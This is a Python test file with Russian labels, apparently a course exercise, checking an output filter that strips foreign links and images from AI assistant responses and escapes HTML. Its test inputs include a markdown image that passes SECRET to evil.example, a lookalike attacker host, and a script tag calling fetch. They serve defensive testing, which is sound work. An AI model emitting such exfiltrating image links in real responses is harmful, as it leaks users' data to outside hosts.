# -*- coding: utf-8 -*-
"""Задание 4. Выход (адаптация tests/test_04_output.py методички)."""
from security import output_layer as L

HOSTS = {"docs.company.example"}


def test_foreign_image_is_removed():
    out = L.check_output("Вот: ![](https://evil.example/c?d=SECRET) конец", HOSTS)
    assert "evil.example" not in out and "SECRET" not in out
    assert "[изображение удалено]" in out


def test_foreign_link_keeps_text_only():
    out = L.check_output("Смотрите [инструкцию](https://evil.example/x) тут", HOSTS)
    assert "evil.example" not in out and "инструкцию" in out


def test_bare_url_is_removed():
    assert "evil.example" not in L.check_output("пишите на https://evil.example/pay", HOSTS)


def test_allowed_host_and_subdomain_pass():
    ok = "[док](https://docs.company.example/a) и https://sub.docs.company.example/b"
    assert L.check_output(ok, HOSTS) == ok


def test_lookalike_host_is_not_allowed():
    out = L.check_output("https://docs.company.example.attacker.com/x", HOSTS)
    assert "attacker.com" not in out


def test_html_is_escaped():
    out = L.check_output("<script>fetch('x')</script>", HOSTS)
    assert "<script>" not in out and "&lt;script&gt;" in out


def test_empty_allowlist_strips_everything():
    out = L.check_output("смотрите [текст](https://good.example/a) и https://ok.example/b", set())
    assert "good.example" not in out and "ok.example" not in out
    assert "текст" in out
